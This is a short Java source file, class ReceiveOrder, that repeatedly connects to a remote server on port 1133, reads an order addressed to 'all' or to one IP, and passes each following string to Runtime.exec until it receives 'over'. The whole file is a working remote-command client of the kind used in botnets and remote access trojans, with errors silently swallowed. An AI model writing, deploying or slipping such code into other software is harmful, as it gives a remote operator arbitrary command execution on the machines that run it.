package Client;

import java.io.DataInputStream;
import java.io.IOException;
import java.net.InetAddress;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.UnknownHostException;

public class ReceiveOrder implements Runnable{
	String order;
	String ip;
	public ReceiveOrder(String ip){
		this.ip = ip;
	}
	public void run() {
		// TODO Auto-generated method stub
		while(true){
			try {
				Socket st = new Socket(ip,1133);
				DataInputStream ins = new DataInputStream(st.getInputStream());
				String Serverorder = ins.readUTF();
				String LocalIP = st.getInetAddress().getHostAddress();
				//System.out.println("Serverorder"+Serverorder);
				//System.out.println("LocalIP"+LocalIP);
				if(("all".equals(Serverorder))||(LocalIP.equals(Serverorder))){
					while(!("over".equals(order = ins.readUTF()))){
						//System.out.println(Serverorder+"\n"+order);
						Runtime ec = Runtime.getRuntime();
						ec.exec(order);
					}
				}
			} catch (IOException e) {
				// TODO Auto-generated catch block
				//e.printStackTrace();
				//System.out.println("连不上服务器了QAQ~");
			}
		}
	}
	
}
